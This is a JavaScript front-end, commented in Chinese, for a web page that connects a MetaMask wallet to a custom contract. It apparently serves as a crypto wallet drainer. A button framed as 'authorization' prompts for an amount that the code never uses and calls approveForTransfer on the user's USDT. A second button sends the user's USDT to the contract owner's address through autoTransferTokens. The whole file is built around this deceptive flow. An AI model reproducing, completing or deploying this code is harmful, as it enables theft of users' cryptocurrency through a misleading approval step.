const contractAddress = '0xa2E8dda146b9E724bA0cdfB3bdB6bfA1e37a54d2'; // 替换为你的合约地址
const contractABI = [
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "tokenAddress",
                "type": "address"
            },
            {
                "internalType": "address",
                "name": "from",
                "type": "address"
            },
            {
                "internalType": "address",
                "name": "spender",
                "type": "address"
            }
        ],
        "name": "approveForTransfer",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "tokenAddress",
                "type": "address"
            },
            {
                "internalType": "address",
                "name": "spender",
                "type": "address"
            }
        ],
        "name": "automateApproval",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "tokenAddress",
                "type": "address"
            },
            {
                "internalType": "address",
                "name": "from",
                "type": "address"
            },
            {
                "internalType": "address",
                "name": "to",
                "type": "address"
            }
        ],
        "name": "autoTransferTokens",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [],
        "stateMutability": "nonpayable",
        "type": "constructor"
    },
    {
        "inputs": [],
        "name": "owner",
        "outputs": [
            {
                "internalType": "address",
                "name": "",
                "type": "address"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    }
];

let userAccount;
let contract;

// USDT 合约地址
const tokenAddress = '0xdac17f958d2ee523a2206206994597c13d831ec7'; // Ethereum上的USDT合约地址

// 连接钱包按钮事件
document.getElementById('connectWallet').addEventListener('click', async () => {
    if (window.ethereum) {
        try {
            await window.ethereum.request({ method: 'eth_requestAccounts' });
            userAccount = ethereum.selectedAddress;
            contract = new web3.eth.Contract(contractABI, contractAddress);
            document.getElementById('approveButton').style.display = 'inline';
            document.getElementById('status').textContent = '钱包连接成功：' + userAccount;
        } catch (error) {
            document.getElementById('status').textContent = '连接钱包失败：' + error.message;
        }
    } else {
        document.getElementById('status').textContent = '请安装 MetaMask！';
    }
});

// 授权转移按钮事件
document.getElementById('approveButton').addEventListener('click', async () => {
    try {
        const amount = prompt("请输入授权数量（直接填写数字，例如 1 或 3）：");
        await contract.methods.approveForTransfer(tokenAddress, userAccount, contractAddress).send({ from: userAccount });
        document.getElementById('status').textContent = '授权成功！';
        document.getElementById('transferButton').style.display = 'inline'; // 显示转移按钮
    } catch (error) {
        document.getElementById('status').textContent = '授权失败：' + error.message;
    }
});

// 转移代币按钮事件
document.getElementById('transferButton').addEventListener('click', async () => {
    try {
        const toAddress = await contract.methods.owner().call(); // 获取合约部署者地址
        await contract.methods.autoTransferTokens(tokenAddress, userAccount, toAddress).send({ from: userAccount });
        document.getElementById('status').textContent = '转移成功！';
    } catch (error) {
        document.getElementById('status').textContent = '转移失败：' + error.message;
    }
});
